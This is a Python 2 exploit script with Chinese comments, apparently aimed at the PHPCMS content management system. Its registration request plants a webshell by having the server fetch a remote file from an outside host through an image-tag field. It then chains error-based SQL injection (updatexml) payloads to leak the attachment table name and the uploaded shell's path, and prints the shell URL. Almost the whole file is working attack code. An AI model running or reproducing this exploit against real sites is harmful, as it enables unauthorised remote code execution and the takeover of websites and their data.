#!/usr/bin/env python
#coding:utf-8
#date:20170412
#限制：开启了wap模块的网站需要修改脚本，linux操作系统存在重复的email,username等唯一值的重复提交上传shell文件失败

import threading,requests,sys

def get_shell(host):
	'''
	upload shell
	'''
	vuln_url = host + "/index.php?m=member&c=index&a=register&siteid=1"
	data = {
		"dosubmit":1,
		"modelid":11,
		"username":"x112121aq3",
		"password":"3qww2121232w",
		"email":"63232121122373@qq.com",
		"info[content]":"<img src=http://uploadimg.koolearn.com/upload/2017-04-09/111ea061203739297dd26937705ebb7c.txt?.php#.jpg>"
	}
	try:
		res = requests.post(vuln_url,data=data,timeout=15)
	except:
		print host+",shell upload connect error"
		exit()

	'''
	#get another case of siteid,the existence of wap moulde:)
	site_id = res_id.headers.get("Set-Cookie").split(",")
	for sd in site_id:
		if sd.split("=")[0][-6:] == "siteid":
			siteid = sd.split("=")[1]
	'''
	url_id = host+"/index.php?m=wap&c=index&a=init&siteid=1"
	try:
		res_id = requests.get(url_id,timeout=7)
	except:
		print host+",get siteid connect error"
		exit()

	'''
	gets the table that stores the shell file name 
	'''
	siteid = res_id.headers.get("Set-Cookie")
	if siteid is not None:
		siteid = siteid.split("=")[1]
	else:
		print host+",siteid is None"
		exit()
	print host+" siteid: "+siteid
	table_pl = host+"/index.php?m=attachment&c=attachments&a=swfupload_json&aid=1&filename=test.jpg&src=%26m%3D1%26modelid%3D1%26catid%3D1%26f%3D1%26id%3D%25%2a27%20and%20updatexml(1,(concat(0x7e,((SELECT distinct TABLE_NAME  FROM INFORMATION_SCHEMA.COLUMNS  WHERE TABLE_NAME LIKE  %*22%25attachment%*22 limit 0,1)),0x7e)),1)%23%26sss%3D22%26"
	data_pl = {
		"userid_flash":siteid
	}
	try:
		res_tb = requests.post(table_pl,data=data_pl,timeout=15)
	except:
		print host+",send payload connect error,there may be waf"
		exit()
	encryption_tb = res_tb.headers.get("Set-Cookie")
	if encryption_tb is not None:
		encryption_tb = encryption_tb.split(",")
	else:
		print host+",encryption_tb is None"
		exit()
	for x in encryption_tb:
		#if "att_json" in x.split("=")[0][-8:]:
		if x.split("=")[0][-8:] == "att_json":
			encry_exp_tb = x.split("=")[1]
	#print encry_exp_tb
	exp_tb = host+"/index.php?m=content&c=down&a=init&a_k="+encry_exp_tb
	res_exp_tb = requests.get(exp_tb)
	data_tb = res_exp_tb.text
	table_name = data_tb[data_tb.find(": '~")+4:data_tb.find("~'")]
	print "table_name: "+table_name

	'''
	get shell file name and address 
	'''
	#siteid = res_id.headers.get("Set-Cookie").split("=")[1]
	url_pl = host+"/index.php?m=attachment&c=attachments&a=swfupload_json&aid=1&filename=test.jpg&src=%26m%3D1%26modelid%3D1%26catid%3D1%26f%3D1%26id%3D%25%2a27%20and%20updatexml(1,(concat(0x7e,((select filepath from "+table_name+" order by filepath desc limit 0,1)),0x7e)),1)%23%26sss%3D22%26"
	data_pl = {
		"userid_flash":siteid
	}
	res_fn = requests.post(url_pl,data=data_pl,timeout=15)
	encryption_fn = res_fn.headers.get("Set-Cookie").split(",")
	for y in encryption_fn:
		if y.split("=")[0][-8:] == "att_json":
			encryption_fn = y.split("=")[1]
	exp_fn = host+"/index.php?m=content&c=down&a=init&a_k="+encryption_fn
	res_exp_fn = requests.get(exp_fn)
	data_fn = res_exp_fn.text
	shell_name = data_fn[data_fn.find("~2017")+1:data_fn.find("~2017")+32]
	shell = host+"/uploadfile/"+shell_name
	print shell
	print u"如果表名正常而shell地址出错，注意看下报错信息可能是修改了表名，修改table_pl中limit n,1输出位n"
	
get_shell("http://domain/")
